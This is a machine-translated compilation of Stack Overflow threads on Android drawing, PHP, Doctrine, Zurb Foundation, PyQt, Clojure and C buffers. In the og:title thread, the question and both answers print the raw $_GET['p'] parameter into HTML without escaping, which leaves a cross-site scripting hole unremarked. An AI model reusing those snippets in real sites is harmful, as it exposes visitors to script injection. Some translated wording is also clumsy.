> 标签：android, android-canvas, paint

我正在为 MapView 顶部的路线实现自定义路径效果，我想出了如何使路径的开始和结束变得圆滑的问题（就像这样`Paint.setStrokeCap(Cap.ROUND)`做）。看截图 - 黑线 - 是我想在最后绕行的路线

以下是我实现自定义 PathEffect 的方式：

```
public RouteOverlay(Context context)
{
    mContext = context;

    mPaint.setStyle(Paint.Style.STROKE);
    mPaint.setColor(COLOR_DEFAULT);
    mPaint.setAntiAlias(true);
    mPaint.setStrokeCap(Cap.ROUND); // this one does not work...
    mPaint.setStrokeJoin(Join.ROUND);
    PathEffect e1 = new PathDashPathEffect(createRouteLineStyle(), 10, 3, PathDashPathEffect.Style.MORPH);
    PathEffect e2 = new CornerPathEffect(10);
    mPaint.setPathEffect(new ComposePathEffect(e1, e2));
}

private Path createRouteLineStyle() 
{
    Path p = new Path();
    p.moveTo(-5, ROUTE_LINE_WIDTH/2);
    p.lineTo(5,ROUTE_LINE_WIDTH/2);
    p.lineTo(5,ROUTE_LINE_WIDTH/2-currentThickness);
    p.lineTo(-5, ROUTE_LINE_WIDTH/2-currentThickness);
    p.close();
    p.moveTo(-5, -(ROUTE_LINE_WIDTH/2));
    p.lineTo(5,-(ROUTE_LINE_WIDTH/2));
    p.lineTo(5, -(ROUTE_LINE_WIDTH/2-currentThickness));
    p.lineTo(-5, -(ROUTE_LINE_WIDTH/2-currentThickness));
    return p;
}

@Override
public void draw(Canvas canvas, final MapView mapView, boolean shadow)
{
    if(shadow) return;

    if(mDrawEnabled)
    {
        synchronized(mPoints)
        {
            canvas.drawPath(mPath, mPaint);
        }
    }
} 
```

正如您在屏幕截图中看到的那样，该行的结尾不是四舍五入的（以及开头......）。`setStrokeCap(Cap.ROUND)`没有帮助。

所以问题是 - 如何在我的自定义路径中添加圆帽？我正在考虑使用`addArc()`或`addCircle()`结束我的路径（和开始），但这似乎不正确。

我需要自定义路径效果的原因 - 是我需要围绕实际道路绘制路线 - 所以路线内部应该是空的并且有内部和外部笔划线。

如果有人知道如何以其他方式制作这种路径效果 - 请告诉我，因为这个解决方案有很大的缺点我必须处理..

![无行程帽](../Images/15932d79b2c9809611bc3f52720265fa.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T18:06:57.163

我设法为我的问题找到了解决方案。所以我摆脱了我的自定义路径效果并开始使用通常的笔画（笔画帽按预期工作）。所以我基本上画了我的路径2次：首先我画黑线，然后我画更细的透明线以清除之前黑线的中心。

这种方法的唯一技巧是我需要在单独的位图中绘制我的路径（使用临时画布），并且当路径位图准备好时 - 将其渲染到主画布。

```
@Override
public void draw(Canvas canvas, final MapView mapView, boolean shadow)
{
    //Generate new bitmap if old bitmap doesn't equal to the screen size (f.i. when screen orientation changes)
    if(pathBitmap == null || pathBitmap.isRecycled() || pathBitmap.getWidth()!=canvas.getWidth() || pathBitmap.getHeight()!=canvas.getHeight())
    {
        if(pathBitmap != null)
        {        
            pathBitmap.recycle();
        }
        pathBitmap = Bitmap.createBitmap(canvas.getWidth(), canvas.getHeight(), Config.ARGB_8888);
        tempCanvas.setBitmap(pathBitmap);
    }

    //Render routes to the temporary bitmap
    renderPathBitmap();

    //Render temporary bitmap onto main canvas
    canvas.drawBitmap(pathBitmap, 0, 0, null);
    }
}

private void renderPath(Path path, Canvas canvas)
{
    routePaint.setStrokeWidth(ROUTE_LINE_WIDTH);
    routePaint.setColor(OUTER_COLOR);
    routePaint.setXfermode(null);

    canvas.drawPath(path, routePaint); //render outer line

    routePaint.setStrokeWidth(ROUTE_LINE_WIDTH/1.7f);
    routePaint.setColor(Color.TRANSPARENT);
    routePaint.setXfermode(new PorterDuffXfermode(Mode.CLEAR));

    canvas.drawPath(path, routePaint); //render inner line
} 
```

所以结果看起来像：

![在此处输入图像描述](../Images/d636a750d9550d33190f02379df349d1.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:25:50.523

[除非您遇到此处提到的问题http://code.google.com/p/android/issues/detail?id=24873](http://code.google.com/p/android/issues/detail?id=24873)，否则我看不出有任何理由不这样做。

# php - 如何从链接实体中获取第一个实体

> ID：11751383
> 
> 赞同：15
> 
> 时间：2012-08-01T01:27:06.940
> 
> 标签：php, symfony, doctrine-orm

我有

```
Class User  {

@OneToMany
    private $profiles
} 
```

现在我的控制器中有 $user 实体，但我还想要基于日期的第一个或最后一个配置文件。我怎样才能做到这一点？

我有方法`getProfiles()`，但我认为这将返回数组集合。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-08-01T01:32:05.997

```
$user->getProfiles()->first() 
```

只要您将`$profiles`财产声明为

```
\Doctrine\Common\Collections\ArrayCollection 
```

在你的类的构造函数中。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2016-10-12T12:38:55.953

你可以很容易地得到第一个这样的：

```
$first = $this->get('doctrine.manager')->getRepository(MyEntity::class)->findOneBy([]); 
```

# php - og:title Facebook 元标签的动态内容

> ID：11751386
> 
> 赞同：0
> 
> 时间：2012-08-01T01:27:24.990
> 
> 标签：php, session, facebook-opengraph

我使用会话值来设置 facebook 元标记的内容：

```
<meta property="og:title" content="<?php print $_GET['p']; ?>"/> 
```

当我查看网站的源代码时，html 显示如下：

```
<meta property="og:title" content="Alex Atalla"/> 
```

这意味着它成功填充了标题元标记内容中的会话值。

但是当我使用 facebook 调试器时，它会说：

```
Object Missing a Required Value:    Object at URL 'http://www.palestinianz.com/' of type 'website' is invalid because a required property 'og:title' of type 'string' was not provided. 
```

问题是什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:11:43.937

设置默认值

```
if(!isset($_GET['p'])){
$value = 'default value';
}else{
$value = $_GET['p'];
}

<meta property="og:title" content="<?php echo $value; ?>"/> 
```

默认值将在您的主页 OG 上

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:05:26.860

好吧，他当然没有填写[http://www.palestinianz.com/](http://www.palestinianz.com/)，因为 og:title 正在填写 URL 中的 p 参数 (GET['p'])。如果我访问[http://www.palestinianz.com/?p=Tivie](http://www.palestinianz.com/?p=Tivie)，则 og:title 会充满“Tivie”。

如果这是所需的效果，则将调试器指向人员页面。[http://www.palestinianz.com/?p=Alex-Atalla](http://www.palestinianz.com/?p=Alex-Atalla)什么的。

编辑：我想我明白你想要做什么。如果你不介意我的建议...

将您的代码更改为：

```
<meta property="og:title" content="<?php print (isset($_GET['p'])) ? $_GET['p'] : 'They Are Palestinians'; ?>"/> 
```

然后阅读[Apache Mod Rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)

# seo - 我该怎么做才能让谷歌列出我的活动？

> ID：11751388
> 
> 赞同：0
> 
> 时间：2012-08-01T01:27:27.247
> 
> 标签：seo

如果您在谷歌中搜索“柏林事件”，是否有人知道谷歌对列出我的数据库/网站事件的期望是什么？

搜索结果如下[所示](https://www.google.com/webhp?sourceid=chrome-instant&ie=UTF-8#hl=de&output=search&sclient=psy-ab&q=events%20berlin&oq=&gs_l=&pbx=1&fp=dcadf66810dc146b&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&biw=1357&bih=686)。

```
Events Berlin, Events Berlin - veranstaltungen.meinestadt.de
veranstaltungen.meinestadt.de/berlinTeilenVeranstaltungen in Berlin: Veranstaltungskalender mit Konzerten ...

Di., 31\. Jul    Invasion der Krebse
Di., 31\. Jul    "Tuet auf die Pforten" Die Neue Synagoge 1...
Di., 31\. Jul    Rudi Dutschke und sein Umfeld im Hanf Muse... 
```

每个事件也有直接链接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:28:18.447

它被称为微格式。[您可以在schema.org](http://schema.org/Event)找到事件微格式。请记住，使用它并不能保证 Google 会在其搜索结果中显示这些事件。

# css - zurb基础是否可以有全行宽

> ID：11751391
> 
> 赞同：33
> 
> 时间：2012-08-01T01:27:45.317
> 
> 标签：css, html, responsive-design, zurb-foundation, grid-system

我正在使用基础 3 来构建响应式网站，但我想让页脚和导航背景宽度占据整个宽度？我已将我的行命名为

```
class="row navigation"
class="row footer" 
```

我试图寻找如何解决这个问题，但我没有选择。我假设它是foundation.css 文件中的一个小修复，但由于我是新手，目前它有点过于庞大。

任何指针都非常感谢。

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2012-10-19T15:57:45.907

我昨天遇到了同样的问题。诀窍是，对于全宽跨越块，您只需将它们排除在行/列结构之外，因为行/列将始终应用默认填充。保留您的页脚和页眉，并在其中使用行/列。

```
<header>
    This will span the full width of the page
</header>
<div class="row">
    <div class="twelve columns">
        This text will flow within all typical padding and margins
    </div>
</div>
<footer>
    This will span the full width of the page
    <div class="row">
        <div class="twelve columns">
            This text will flow within all typical padding and margins
        </div>
    </div>
</footer> 
```

* * *

## 回答 #2

> 赞同：66
> 
> 时间：2013-03-13T15:38:41.130

我一直在做的是添加一个自定义类，以便我可以将它与 .row 链接并覆盖最大宽度设置。

`<div class="row full-width"></div>`

```
.row.full-width {
  width: 100%;
  max-width: 100%; 
} 
```

我在这里也放了宽度来覆盖基础，但是它已经在foundation.css中声明了，所以你可以省略它。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-09-05T00:09:58.493

如果您使用的是 Zurb Foundation Framework，只需删除`row`该类并将元素包装在一个`container`100% 宽度的类中。现在你可能想把这些东西放在中心，使用这样的类`centered`：

```
<div class="container navigation">
    <div class="centered">
        Some navigation stuff
    </div>
</div> 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-08-01T13:33:04.030

我完全不同意这个答案。你不应该使用 !important

请参考我在[http://edcharbeneau.github.com/FoundationSinglePageRWD/上的文章和演示](http://edcharbeneau.github.com/FoundationSinglePageRWD/)

你应该能够从那里得到你需要的东西。该演示适用于 2.2，但在功能上与 v3 非常相似。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-06-10T21:05:15.390

使用“部分”，如：

```
<section>
  <div class="row">
   <div class="small-12 columns">
   </div>
  </div>
</section> 
```

然后，为该部分分配一个 ID，并将其用于您的背景。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2016-12-13T06:32:43.203

Foundation 6 自然地支持这个特性`row expanded`。代码示例：

```
<div class="expanded row">
    ...
</div> 
```

在这里阅读更多：http: [//foundation.zurb.com/sites/docs/grid.html#fluid-row](http://foundation.zurb.com/sites/docs/grid.html#fluid-row)

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2014-12-10T11:38:02.950

这是关于Foundation 5的。到目前为止给出的答案都没有提供边到边的全宽。那是因为内部`.columns`添加了填充。

要获得真正的边到边全宽内容，请将其添加到您的 CSS 中。

```
.row.full { width: 100%; max-width: 100%; }
.row.full>.column:first-child,
.row.full>.columns:first-child { padding-left: 0; }
.row.full>.column:last-child,
.row.full>.columns:last-child { padding-right: 0; } 
```

只需将`.full`类添加到`.row`您希望扩展全宽的类。

```
<div class="row full">
  <div class="medium-6 column">This column touches Left edge.</div>
  <div class="medium-6 column">This column touches Right edge.</div>
</div> 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-04-15T08:52:45.877

`max-width`只需将属性覆盖为`max-width: initial;`，例如，

```
 .fullWidth {
       width: 100%;
       margin-left: auto;
       margin-right: auto;
       max-width: initial;
    }

<div class="row fullWidth"> </div> 
```

这对我有用:)

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2014-07-06T10:59:46.727

我知道已经有很多答案了，但是如果有人使用**Foundation 5**并且偶然发现了这个问题（比如我），我想我可以在这个主题中添加一些新内容。

由于 Foundation 使用 REM 单元，最好`.row`使用它们来改变类并添加额外的类，这样你就可以只选择全宽的行。例如通过使用`.full`类：

```
.row.full {
    max-width: 80rem;  /* about 90rem should give you almost full screen width */
} 
```

即使在 Zurb Foundation 的文档页面中，您也可以看到它是这样使用的（`.row`尽管他们改变了类）： http: [//foundation.zurb.com/docs/](http://foundation.zurb.com/docs/)（只需查看页面源代码）

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-02-12T13:25:18.093

你真的会想要保留行类，否则你会失去很多网格系统的力量。为什么不将 $rowWidth 的设置从 1000（默认）更改为 100%。这可以在文件foundation_and_overrides.scss 中找到

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2014-09-03T11:05:50.307

只需设置

```
$row-width: 100%; 
```

[http://foundation.zurb.com/forum/posts/927-full-width-layouts](http://foundation.zurb.com/forum/posts/927-full-width-layouts)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-02-04T23:28:17.247

如果您不给它“行”类并在其中放置列，则它的宽度为 100%

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2013-01-01T23:12:12.557

我不确定我是否遗漏了什么，但我必须添加一个`.row`div`.centered`才能工作。在这种情况下，我仍然可以将其`.header`设置为具有全宽背景，但该`.container`方法对我不起作用。

```
<header class="header">
  <div class="row">
    <div class="centered">
       Logo and stuff
    </div>
  </div>

  <div class="row">
    Some navigation stuff   
  </div>
</header> 
```

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2015-06-18T10:23:11.013

如果您使用的是 sass，这是一种更好的方法：

```
 <div class="row full-width"></div>

.row{
    &.full-width{ 
        width: 100%; 
        max-width: 100%!important; //might be needded depending on your settings
        &>.column:first-child,
        &>.columns:first-child{ 
            padding-left: 0; 
        }
        &>.column:last-child,
        &>.columns:last-child{ 
            padding-right: 0; 
        }
    }
} 
```

* * *

## 回答 #15

> 赞同：-5
> 
> 时间：2013-11-06T09:01:18.833

是的，就像这样使用：

```
 <div class="large-12 columns">

    <h2>Header Twelve Columns (this will have full width of the BROWSER <---->></h2>

  </div> 
```

# javascript - JQRangeSlider 中的 JavaScript 错误

> ID：11751395
> 
> 赞同：0
> 
> 时间：2012-08-01T01:28:27.470
> 
> 标签：javascript, jquery, jquery-ui, slider

JQRangeSlider 似乎有一些问题。试图将此工具实现到 MVC 项目中。在调用滑块后，永远不会到达警报。有错误吗？我在 Dreamweaver 的另一个项目中工作，虽然它在实时预览模式下呈现良好，但无法将它带到任何浏览器。这是我的代码...

```
 ViewBag.Title = "Test";
    Layout = "";
    }

<html>
<head>
<title>"Slider"</title>
    <link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/start/jquery-           ui.css" rel="stylesheet" type="text/css" />
    <link href="@Url.Content("~/Content/slider/CSS/classic.css")" rel="stylesheet"   type="text/css" />

    <script src="@Url.Content("http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js")" type="text/javascript"></script>
    <script src="../../Content/slider/Scripts/jquery-ui-1.8.22.custom.min.js" type="text/javascript"></script>

    <script src="@Url.Content("~/Content/slider/Scripts/jQRangeSliderMouseTouch.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQRangeSliderDraggable.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQRangeSliderBar.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQDateRangeSliderHandle.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQRangeSliderLabel.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQEditRangeSliderLabel.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQRangeSlider.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Content/slider/Scripts/jQEditRangeSlider.js")" type="text/javascript"></script>
</head>

<body>

<div class="page-header">
    <h2>Test</h2>

</div>
<div id="slider" style="width:200px;"></div>
<input type="text" class="datepicker" />

<script type="text/javascript">
    $(function () {

        $("#slider").editRangeSlider();
        alert("whocareswhateverbye");

    });

</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-26T06:35:59.983

我认为你的代码失败了

```
 $("#slider").editRangeSlider(); 
```

由于与 jQuery 1.7 的兼容性问题，所以它永远不会达到警报。

它与 jQuery 1.8 一起工作正常，如下所示：

[http://jsfiddle.net/QwAqy/1/](http://jsfiddle.net/QwAqy/1/)

# qt - 从 QWebView 中的 javascript 访问 python 函数

> ID：11751401
> 
> 赞同：0
> 
> 时间：2012-08-01T01:29:57.743
> 
> 标签：qt, pyqt4, qwebview

我正在编写一个 Python/PyQt4 应用程序，它在 QWebView 小部件中生成并显示一个页面。该页面包含我希望能够调用从 python 应用程序返回数据的函数的 javascript 代码。

到目前为止，我可以调用不返回数据的函数（使用 pyqtSlot 装饰器），并通过将参数公开为属性来调用接受参数的函数（使用 pyqtProperty 装饰器）。我还没有弄清楚如何做的是调用一个带有参数的python函数，它返回数据。

问题 9615194 解释了如何从 C++ 执行此操作，但我看不到如何将其传输到 PyQt4。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:27:44.677

我怀疑您没有使用`result=`关键字在`pyqtSlot`装饰器中指定返回值？

```
@pyqtSlot(str, result=str)
def echo(self, phrase):
    return self.parent().echo(phrase) 
```

我最近自己也遇到了这个问题。如果省略`result=`，则不会产生错误，该方法只是默默地不返回任何内容。非常令人抓狂，直到我想通了。请参阅我对[这个问题](https://stackoverflow.com/questions/11731709/how-does-one-expose-methods-and-properties-on-dbus-using-a-qdbusabstractadaptor)的回答以获取一个有效的示例。

# jquery - 使用 jQuery 和 jPlayer 的在线广播

> ID：11751402
> 
> 赞同：-1
> 
> 时间：2012-08-01T01:30:00.113
> 
> 标签：jquery, radio, jplayer, shoutcast

我按照本网站[http://www.catswhocode.com/blog/how-to-create-an-online-radio-using-jquery-and-jplayer](http://www.catswhocode.com/blog/how-to-create-an-online-radio-using-jquery-and-jplayer)上的说明进行操作，并按照链接中的说明制作收音机，但是我有一个问题，我想在[http://www.listen2myradio.com/](http://www.listen2myradio.com/)的帮助下进行直播在同一个 jplayer 上，但我希望任何人帮助我编写代码，因为我希望 jplayer 在shoutcast 开始流式传输时自动停止从数据库播放，并且当流式传输关闭时，它应该再次从数据库开始播放。第二件事是jplayer为每个听众随机选择歌曲，所以对于收音机来说这有点不寻常，因为收音机一次为所有听众播放一首歌曲，所以我想知道jplayer从数据库中随机选择一首歌曲的任何方式和为所有听众播放并重复相同的过程。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T14:53:38.217

如果您想要传统的互联网广播服务（所有用户同时听到相同的内容），您应该对流服务器端进行编码。客户端然后连接到服务器，服务器在编码时向他们发送流数据。

通常，您将为此使用[SHOUTcast](http://www.shoutcast.com/broadcast-tools/) / [Icecast](http://www.icecast.org/)。对于编码，您可以使用多种软件。我个人使用[Edcast](http://code.google.com/p/edcast-reborn/downloads/list)。对于音频播放，我通常使用[VLC](http://www.videolan.org/vlc)。

# php - move_uploaded_file 将文件放在目标目录之外

> ID：11751408
> 
> 赞同：1
> 
> 时间：2012-08-01T01:30:28.947
> 
> 标签：php, mysql, file-upload, directory

我目前有以下内容：

```
 if (in_array($_FILES['userfile']['type'], $mimeTypes))
      {

$target_path = "./uploads/{$_SESSION['email']}";

$target_path = $target_path . basename( $_FILES['userfile']['name']);

if(move_uploaded_file($_FILES['userfile']['tmp_name'], $target_path)) {
    echo "The file ".  basename( $_FILES['userfile']['name']).
    " has been uploaded";

} else{
    echo "There was an error uploading the file, please try again!";
} 
```

当有人创建登录时，会使用他们的电子邮件 0666 权限为用户创建一个目录。

目前， move_uploaded_file() 将文件放在用户目录之外的上传目录中。错误被抛出。我已经多次检查我的相对路径是否正确。

我使用的是 Ubuntu，上传的文件上有一个 Lock 符号，但我可以拖放到用户的文件夹中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:36:22.520

您`$target_path`似乎缺少`/`用户目录后的 a ，因为`basename()`' 的输出不包括`/`.

```
// Append trailing slash
$target_path = "./uploads/{$_SESSION['email']}/";
$target_path = $target_path . basename( $_FILES['userfile']['name']); 
```

目录的正确权限应该是`0755`（您不希望它是世界可写的！），因为目录应该具有文件系统可以遍历的执行权限。您可以使其组可写 ( `0775`) 并确保上传目录的组设置为 Apache Web 服务器用户。这最好通过在 uploads/ 目录上设置 setgid 并将其组设置为 apache 用户来完成，以便使用在其下创建的目录继承正确的写权限而不是全局可写的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:37:46.137

看起来您的`$target_path`需求是`/`在它之后，或者与下一行一起加入只会制作一个文件，其中包含他们的电子邮件地址。

```
$target_path = "./uploads/{$_SESSION['email']}/";

$target_path = $target_path . basename( $_FILES['userfile']['name']); 
```

如果它仍然放在`uploads/`目录中，请检查`$_SESSION['email']`是否设置正确。

# clojure - 有没有办法改变 Clojure 中的参数？

> ID：11751409
> 
> 赞同：3
> 
> 时间：2012-08-01T01:30:35.150
> 
> 标签：clojure

在 lisp 中，我可以将参数传递给函数并在函数内对其进行更改。（AKA 破坏性功能）。但是，在 Clojure 中，我在某处读到不允许更改同一函数中的给定参数。例如：

```
(defn add-two-lists [list1 list2]
  (for [n (range (count list1))]
    (+ (nth list1 n) (nth list2 n)))) 
```

这是一个普通函数，它的输出是两个相同列表的相加。但是，我想要这样的东西：

```
(defn add-two-lists [list1 list2 added_list]
  (set! added_list 
       (for [n (range (count list1))]  
          (+ (nth list1 n) (nth list2 n))))) 
```

也许我的使用`set!`错误或误用，我仍然得到错误。有没有一种优雅的方式来破坏性地修改 Clojure 中的参数？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-01T03:14:00.157

Clojure 不鼓励破坏性修改 - 我鼓励您找到编写代码的方法，而无需诉诸破坏性更新。

本着提供 Clojurey 解决方案的精神，我将编写您的`add-two-lists`函数如下：

```
(defn add-two-lists [list1 list2]
  (map + list1 list2)) 
```

这有几个优点：

*   它纯粹是功能性的
*   它很懒，所以你甚至可以添加无限长的列表（尝试使用破坏性更新的参数来做到这一点！）
*   它的性能是 O(n)，这是最佳的 - 问题中的版本实际上是 O(n^2)，因为`nth`它本身就是对列表的 O(n) 操作。
*   很好很简洁:-)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-01T02:58:41.057

Clojure 提供了几种在这种情况下可以很好地工作的可变类型，例如，您可以[将 an 传递`atom`](http://clojure.org/atoms)给函数并让它在该原子中设置值。

```
(defn add-two-lists [list1 list2 added_list]
  (reset! added_list 
    (for [n (range (count list1))]  
       (+ (nth list1 n) (nth list2 n))))) 
```

然后在你调用它之后，你可以使用`@`/`deref` 编辑从原子中获取值：如果效率是目标，那么使用[瞬态集合](http://clojure.org/transients)可能会有所帮助

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T05:41:02.397

[with-local-vars](http://clojuredocs.org/clojure_core/clojure.core/with-local-vars)宏允许您创建可以使用[var-set](http://clojuredocs.org/clojure_core/clojure.core/var-set)修改的线程本地绑定变量。[您还必须使用var-get](http://clojuredocs.org/clojure_core/clojure.core/var-get)访问 var 的值，它可以缩写为 @。

```
(defn add-two-lists [list1 list2 added-list]
  (var-set added-list 
           (for [n (range (count list1))]  
             (+ (nth list1 n) (nth list2 n)))))

(with-local-vars [my-list nil]
  (add-two-lists '(1 2 3) '(3 4 5) my-list)
  @my-list) 
```

***编辑：***

在风格上，您可以使用[map](http://clojuredocs.org/clojure_core/clojure.core/map)添加两个列表，而无需使用第 n 个函数来随机访问每个列表中的每个索引：

```
(defn add-two-lists [list1 list2 added-list]
  (var-set added-list (map + list1 list2))) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-01T02:24:15.517

来自现场的clojure 文档[！](http://clojure.org/vars#set)

```
 Note - you cannot assign to function params or local bindings. Only Java fields, Vars, Refs and Agents are mutable in Clojure. 
```

通常在选择函数式语言的课程中，我们鼓励您不要使用 for 循环和赋值。相反，您应该支持函数的递归和组合。

因此，如果我想为列表的每个元素添加 2，在命令式语言中，我只会做一个 for 循环，但在函数式语言中，我会使用递归

```
user=> (def add2
  (fn [mylist]
    (if 
      (empty? mylist) 
        nil
        (cons (+ (first mylist) 2) (add2 (rest mylist))))))

user=> (add2 (list 1 2 3))
(3 4 5) 
```

# php - 向我的网站添加“命令提示符”...这是我应该怎么做的吗？

> ID：11751411
> 
> 赞同：1
> 
> 时间：2012-08-01T01:30:41.520
> 
> 标签：php, command-prompt, string-parsing

```
function parseCommandString( $str ) {
    $chunks = explode( '"', $str );
    $cmd = array();

    // Split the command into space-separated parameters (preserving quoted portions)
     $c = count($chunks);
    for( $i=0; $i<$c; $i++ ) {
        if( $i % 2 == 0 ) {
            if( $chunks[$i] == '' ) {
                continue;
            }

            $params = explode( ' ', $chunks[$i] );
             $pc = count($params);
            for( $j=0; $j<$pc; $j++ ) {
                if( $params[$j] != '' ) {
                    $cmd[] = $params[$j];
                }
            }
        } else {
            if( $chunks[$i] != '' ) {
                $cmd[] = $chunks[$i];
            }
        }
    }
    return $cmd;
} 
```

看起来很简单，但我对这是否是我想做的最佳实现缺乏洞察力。也就是说，我只需要先将一个字符串分成一个子字符串数组，然后按引号部分，然后按空格（即在未引用的部分中）。它就像我网站上的实际命令提示符。

洞察力赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:39:46.803

以下是我将如何处理这个项目：

1）从测试开始。例如。

```
isEqual(parseCommandString('hello world', ["hello", "world"]));
isEqual(parseCommandString('hello "world a"', ["hello", "world a"])); 
```

2）使您的代码适合这些测试，然后添加更多极端情况 - 例如，未闭合的引号。

如果您要构建的是真正的命令行（即 shell），请考虑使用开源项目，例如。[http://code.google.com/p/php-web-shell/](http://code.google.com/p/php-web-shell/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:42:04.430

您可以尝试 python 的 optparse 模块的这个端口：[https](https://github.com/lelutin/php-optparse) ://github.com/lelutin/php-optparse ，或者这个更新的库：[https](https://github.com/lelutin/php-options)
://github.com/lelutin/php-options 两者似乎都非常强大并且会可能比从头开始编写自己的解析器要好。

# pointers - 将数组的内容打印到文件中

> ID：11751414
> 
> 赞同：0
> 
> 时间：2012-08-01T01:31:22.877
> 
> 标签：pointers, buffer

指针相关问题。我正在浏览一些示例代码，这些代码当前将数据从名为**dataFile**的文件读取到缓冲区中。读取在循环内完成，如下所示：

```
unsigned char* buffer = (unsigned char*)malloc(1024*768*);
fread(buffer,1,1024*768,dataFile);
redPointer = buffer;
bluePointer = buffer+1024;
greenPointer = buffer+768; 
```

现在，我想尝试将数组**缓冲区的****全部**内容写入文件，这样我就可以只保存那些离散的图像（而不是大文件）。但是，我不完全确定如何去做。

 **我试图计算语句，但是我在控制台上打印出垃圾字符，并且 PC 发出哔哔声。所以我结束了我的程序。

除此以外是否还有其他方法：

```
for (int i=0; i < (1024*768); i++) {
fprintf(myFile, "%6.4f , ", buffer[i]); 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:32:36.200

By declaring your buffer as a `char*`, any pointer arithmatic or array indexes will use `sizeof(char)` to calculate the offset. A char is 1 byte (8 bits).

I'm not sure what you are trying to do with the data in your buffer. Here are some ideas:

Print the value of each byte in decimal, encoded as ASCII text:

```
for (int i=0; i < (1024*768); i++) {
    fprintf(myFile, "%d , ", buffer[i]);
} 
```

Print the value of each byte in hexadecimal, encoded in ASCII text:

```
for (int i=0; i < (1024*768); i++) {
    fprintf(myFile, "%x , ", buffer[i]);
} 
```

Print the value of each floating point number, in decimal, encoded in ASCII text *(I think my calculation of the array index is correct to process adjacent non-overlapping memory locations for each float)*:

```
for (int i=0; i < (1024*768); i += sizeof(float)) {
    fprintf(myFile, "%6.4f , ", buffer[i]);
} 
```

Split the buffer into three files, each one from a non-overlapping section of the buffer:

```
fwrite(redPointer, sizeof(char), 768, file1);
fwrite(greenPointer, sizeof(char), 1024-768, file2);
fwrite(bluePointer, sizeof(char), (1024*768)-1024, file3); 
```

Reference for [fwrite](http://www.cplusplus.com/reference/clibrary/cstdio/fwrite/). Note that for the `count` parameter I simply hard-coded the offsets that you had hard-coded in your question. One could also subtract certain of the pointers to calculate the number of bytes in each region. Note also that the contents of these three files will only be sensible if those are sensibly independent sections of the original data.

Maybe this gives you some ideas.

**Updated:** so I created a complete program to compile and test the formatting behavior. This only prints the first 20 items from the buffer. It compiles (with `gcc -std=c99`) and runs. I created the file `/tmp/data` using `ghex` and simply filled in some random data.

```
#include <stdlib.h>
#include <stdio.h>

int main()
    {
    FILE* dataFile = fopen("/tmp/data", "rb");
    if (dataFile == NULL)
        {
        printf("fopen() failed");
        return -2;
        }

    unsigned char* buffer = (unsigned char*)malloc(1024*768);
    if (buffer == NULL)
        {
        printf("malloc failed");
        return -1;
        }

    const int bytesRead = fread(buffer,1,1024*768,dataFile);
    printf("fread() read %d bytes\n", bytesRead);

    // release file handle
    fclose(dataFile); dataFile = NULL;

    printf("\nDecimal:\n");
    for (int i=0; i < (1024*768); i++) {
        printf("%hd , ", buffer[i]);
        if (i > 20) { break; }
    }
    printf("\n");

    printf("\nHexadecimal:\n");
    for (int i=0; i < (1024*768); i++) {
        printf("%#0hx , ", buffer[i]);
        if (i > 20) { break; }
    }
    printf("\n");

    printf("\nFloat:\n");
    for (int i=0; i < (1024*768); i += sizeof(float)) {
        printf("%6.4f , ", (float)buffer[i]);
        if (i > 20) { break; }
    }
    printf("\n");

    return 0;
    } 
```**

# javascript - Fancybox / Galleriffic 冲突 - 主图像导航链接

> ID：11751415
> 
> 赞同：0
> 
> 时间：2012-08-01T01:31:38.197
> 
> 标签：javascript, fancybox, gallery, lightbox, galleriffic

我正在构建一个 Web 展示页面，当用户单击项目缩略图时，该页面使用 Fancybox v2.0.6 打开隐藏的 div。每个 Fancybox div 都包含每个项目的概述和一个 Galleriffic 截图库。[由于这个 Google Group Discussion](http://code.google.com/p/galleriffic/issues/detail?id=76) ，我已经能够在这一页上使用多个 Galleriffic 画廊，但在主图像上遇到了问题。

